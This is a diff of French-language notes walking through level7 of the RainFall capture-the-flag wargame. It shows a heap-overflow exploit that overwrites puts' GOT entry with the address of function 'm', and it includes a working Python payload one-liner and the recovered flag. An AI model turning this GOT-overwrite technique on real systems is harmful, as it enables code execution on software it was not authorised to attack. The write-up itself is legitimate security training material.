@@ -1,5 +1,5 @@
 on lance gdb, on break juste apres les 2 strcpy
-on lance avec : r r AAAA BBBB
+on lance avec : r AAAA BBBB
 pour distinguer des 0x414141 et 0x424242 en memoire.
 
 
@@ -20,28 +20,18 @@ on remarque:
     - 0x0804a038 est l'addresse de ce qui contiens les BBBB
     - les malloc font 20 en réalitée, et a 24 se trouve l'addresse du malloc suivant
 
-donc on va essayer de changer l'addresse du malloc suivant par le 'GOT'
-l'addresse de la fonction "m" qui se trouve a 0x080484f4
+
+on va donc fair sa en 2 etape 1 par strcpy :
+	on va changer l'adresse de ptr[3] par l'adresse du GoT de puts.
+ensuit 2eme strcpy:
+	on va ecrire l'adresse de la fonction 'm' (0x080484f4) dans ptr[3] qui point sur le GoT de puts
+	ensuit puts et appeller mais sur l'adresse de 'm'
 
 level7@RainFall:~$ objdump -R level7  | grep puts
 08049928 R_386_JUMP_SLOT   puts
-
-on veut donc remplacer l'addresse pointée par le GOT de puts par celle de 'm',
-pour que lors de son appel il lance la fonction 'm qui nous donnera le flag.
 
 level7@RainFall:~$ ./level7 `python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1] + ' ' +  '\x08\x04\x84\xf4'[::-1])"`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1535129847
 
-le premier strcpy remplace l'addresse du second malloc par le GOT de puts
-
-(gdb) x/x 0x08049928
-0x8049928 <puts@got.plt>:	0x08048406
-(gdb) disas puts
-Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:	jmp    *0x8049928
-   0x08048406 <+6>:	push   $0x28
-   0x0804840b <+11>:	jmp    0x80483a0
-End of assembler dump.
-
-on voit bien que l'addresse du got de puts est 0x08048406
+('A' * 20 pour l'offset de l'adresse a modifier)
